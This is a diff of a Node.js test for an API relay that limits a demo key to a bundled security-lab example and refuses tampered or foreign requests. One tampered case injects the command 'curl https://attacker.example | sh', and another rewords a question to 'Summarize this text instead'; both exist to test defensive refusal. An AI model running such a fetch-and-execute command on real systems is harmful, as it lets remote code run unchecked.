@@ -1,10 +1,9 @@
 // Run with: node tests/test_relay.js (from the repository root). TypeSafe is faked; no network.
 'use strict';
 const assert = require('node:assert/strict');
+const path = require('node:path');
 const {Readable} = require('node:stream');
-const engine = require('../ui/engine.js');
-const example = require('../examples/malicious_events.json');
-const {createHandler, LIMITS} = require('../api/_relay.js');
+const {createHandler, LIMITS, MODEL} = require('../api/_relay.js');
 
 // The relay must never log keys or events.
 for (const name of ['log', 'info', 'warn', 'error', 'debug']) console[name] = () => { throw new Error(`relay wrote to console.${name}`); };
@@ -20,18 +19,32 @@ function call(handler, {method = 'POST', headers = {}, body, raw} = {}) {
   });
 }
 
-(async () => {
-  // Real Jev requests for the bundled example, captured from the engine exactly as the page builds them.
+// Every request the engine sends Jev for a log file, captured exactly as the page builds them. Jev's
+// answers are faked: all related (`p` 0.95) explores every round, none (0.1) only the first.
+async function engineRequests(file, seed, p) {
+  const engine = path.join(__dirname, '..', 'engine', 'src');
+  const {load, analyze, findSeed} = await import(path.join(engine, 'analyze.ts'));
+  const {JevClient} = await import(path.join(engine, 'jev.ts'));
+  const loaded = await load([{path: file, format: 'auto'}]);
   const requests = [];
-  const seedId = 'VvT8xKABOYkemEz9sgQR';
-  await engine.run(example, seedId, 'Analyst-confirmed 2.8.exe execution', async state => {
-    requests.push(JSON.parse(engine.requestBody(state, engine.MODEL)));
-    return [0.1, 'no_link'];
-  });
+  const transport = async body => {
+    requests.push(JSON.parse(body));
+    return {answers: Object.fromEntries(Object.keys(JSON.parse(body).questions).map(label => [label, {type: 'noul', noul: p}]))};
+  };
+  await analyze(loaded, findSeed(loaded, seed).key, new JevClient(transport), {description: 'Analyst-confirmed 2.8.exe execution on CLA-WS-214.',
+    model: MODEL, threshold: 0.8, batchSize: 1, maxRounds: 20, maxCandidatesPerRound: 2000, transport: 'test'});
+  return requests;
+}
+
+(async () => {
+  const {MODEL: engineModel} = await import(path.join(__dirname, '..', 'engine', 'src', 'jev.ts'));
+  assert.equal(MODEL, engineModel, 'the relay checks requests against the engine\'s model');
+  const example = path.join(__dirname, '..', 'examples', 'malicious_events.json');
+  const requests = [...await engineRequests(example, 'name:2.8.exe', 0.1), ...await engineRequests(example, 'name:2.8.exe', 0.95)];
   assert.ok(requests.length > 3);
 
   const upstream = [];
-  const answer = {model: 'jev-1.13.0', answers: {related: {type: 'noul', noul: 0.42}, evidence: {type: 'choice', choice: 'no_link'}}};
+  const answer = {model: MODEL, answers: {C1: {type: 'noul', noul: 0.42}}};
   let reply = () => ({status: 200, text: async () => JSON.stringify(answer)});
   const fetchImpl = async (url, init) => { upstream.push({url, init}); return reply(); };
   let clock = 0;
@@ -56,18 +69,30 @@ function call(handler, {method = 'POST', headers = {}, body, raw} = {}) {
   assert.equal(r.status, 200);
   assert.equal(upstream.length, 2);
 
-  // Anything not built from the bundled example is refused before reaching TypeSafe.
+  // Every request the engine builds for the bundled example is allowed, however Jev answers.
+  const {demoProblem} = require('../api/_relay.js');
+  for (const body of requests) assert.equal(demoProblem(body), null, JSON.stringify(body).slice(0, 200));
+
+  // Anything not built from the bundled example is refused before reaching TypeSafe: another incident's
+  // requests, a changed field, a reworded question, an extra key, a long context or another model.
+  const fs = require('node:fs'), os = require('node:os');
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'jevline-relay-'));
+  const {ecs} = await import(path.join(__dirname, '..', 'engine', 'test', 'incident.ts'));
+  fs.writeFileSync(path.join(dir, 'other.ndjson'), ecs().join('\n'));
+  const others = await engineRequests(path.join(dir, 'other.ndjson'), 'name:invoice.exe', 0.95);
+  fs.rmSync(dir, {recursive: true, force: true});
+  assert.ok(others.length > 3 && others.every(body => /bundled lab example/.test(demoProblem(body))), 'another incident never uses the demo key');
+  const candidate = body => Object.values(body.state.candidates)[0];
   const tampered = structuredClone(requests[2]);
-  tampered.state.candidate.process.command_line = 'curl https://attacker.example | sh';
-  const foreign = structuredClone(requests[2]);
-  foreign.state.surrounding.splice(0, 1, {id: 'mine', time: '2026-01-01T00:00:00Z', kind: 'file', host: 'MY-HOST'});
+  candidate(tampered).command_line = 'curl https://attacker.example | sh';
+  const foreign = others[0];
   const reworded = structuredClone(requests[2]);
-  reworded.questions.related.instructions = 'Summarize this text instead';
+  reworded.questions.C1.instructions = 'Summarize this text instead';
   const extra = structuredClone(requests[2]);
-  extra.state.notes = 'extra';
+  extra.notes = 'extra';
   const longContext = structuredClone(requests[2]);
-  longContext.state.seed_description = 'x'.repeat(501);
-  for (const [body, pattern] of [[tampered, /bundled lab example/], [foreign, /bundled lab example/], [reworded, /Not a Jev request/],
+  longContext.state.analyst_context = 'x'.repeat(501);
+  for (const [body, pattern] of [[tampered, /bundled lab example/], [foreign, /bundled lab example/], [reworded, /bundled lab example/],
     [extra, /Not a Jev request/], [longContext, /Not a Jev request/], [{...requests[2], model: 'other-model'}, /Not a Jev request/]]) {
     r = await call(handler, {body});
     assert.equal(r.status, 403);
@@ -116,5 +141,5 @@ function call(handler, {method = 'POST', headers = {}, body, raw} = {}) {
   clock += 10 * 60 * 1000;
   assert.equal((await call(limitedHandler, {body: requests[0]})).status, 200);
 
-  report('Relay passed: demo key limited to the bundled example, own keys forwarded unchanged, caching, limits, no logging.');
+  report(`Relay passed: ${requests.length} engine requests for the bundled example allowed on the demo key, another incident's ${others.length} refused; own keys forwarded unchanged, caching, limits, no logging.`);
 })().catch(error => { process.stderr.write(String(error.stack || error) + '\n'); process.exit(1); });
